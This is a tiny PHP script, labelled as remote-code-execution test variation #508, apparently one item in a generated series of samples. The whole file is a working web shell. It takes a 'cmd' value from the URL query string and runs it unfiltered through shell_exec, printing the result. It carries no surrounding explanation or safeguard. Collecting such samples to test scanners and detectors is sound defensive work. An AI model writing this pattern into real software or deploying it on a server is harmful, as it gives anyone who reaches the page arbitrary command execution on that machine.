<?php
// RCE test variation #508
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>